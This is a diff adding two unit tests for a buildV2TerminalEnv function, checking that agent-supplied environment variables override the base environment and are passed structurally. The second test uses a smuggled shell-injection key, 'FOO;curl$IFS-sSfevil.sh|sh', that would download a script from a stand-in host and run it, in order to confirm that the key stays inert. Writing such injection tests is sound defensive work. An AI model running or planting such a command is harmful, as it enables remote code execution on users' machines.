@@ -458,6 +458,26 @@ describe("buildV2TerminalEnv", () => {
 		expect(devEnv.SUPERSET_ROOT_PATH).toBe("");
 	});
 
+	test("applies agentEnv structurally, overriding the base snapshot", () => {
+		const env = buildV2TerminalEnv({
+			...baseParams,
+			agentEnv: { ANTHROPIC_API_KEY: "sk-test", PATH: "/agent/bin" },
+		});
+		expect(env.ANTHROPIC_API_KEY).toBe("sk-test");
+		expect(env.PATH).toBe("/agent/bin");
+	});
+
+	test("carries a shell-metacharacter env key as a plain var, never parsed", () => {
+		// If this key were interpolated into a shell command it would be RCE.
+		// Passed structurally it is just an (odd) env var name — inert.
+		const injectionKey = "FOO;curl$IFS-sSfevil.sh|sh";
+		const env = buildV2TerminalEnv({
+			...baseParams,
+			agentEnv: { [injectionKey]: "1" },
+		});
+		expect(env[injectionKey]).toBe("1");
+	});
+
 	test("defaults COLORFGBG to dark mode", () => {
 		const env = buildV2TerminalEnv(baseParams);
 		expect(env.COLORFGBG).toBe("15;0");
